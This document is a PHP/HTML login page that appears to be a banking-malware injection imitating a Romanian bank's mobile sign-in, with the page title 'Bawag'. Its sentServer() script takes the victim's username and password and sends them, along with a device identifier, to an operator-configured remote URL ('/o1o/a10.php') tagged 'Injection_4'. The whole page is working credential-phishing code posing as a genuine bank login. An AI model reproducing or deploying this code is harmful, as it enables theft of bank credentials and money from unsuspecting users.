<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="ro/ro.btrl.mobile/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
	<div id="header">
		<b> Ajutor </b>
	</div>
	<div id="line"></div>

	<div class="underheader">
		<img src="data:image/png;base64,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">
	</div>

	<div id="line"></div>
	<br>

    <div class="main">
        <div class="container">
<div id="row">
	<p> English | <b>Romana</b> | Italiano </p>
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
<br>
					<form id="form">
                            <div class="form-group">
									<label>Utilizator:</label>
									<input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="10" data-reg="/.{4,10}/" >
                           </div>
						   <br>
                            <div class="form-group">
									<label>Parola:</label>
									<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{4,10}/" maxlength="10" >
                            </div><br>

                       				<input type="button" class="input_submitBtn" onClick="sentServer();" value="Autentificare">
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');

	if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
		var url='<?php echo $URL; ?>';
		var imei_c='<?php echo $IMEI_country; ?>';

		var login1 = document.forms["form"].elements["login"].value;
		var pass = document.forms["form"].elements["password"].value;

		location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|btrl_mobile|"+login1+"|"+pass);
	}
}
</script>
 </form><br>
</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>
</body>
</html>
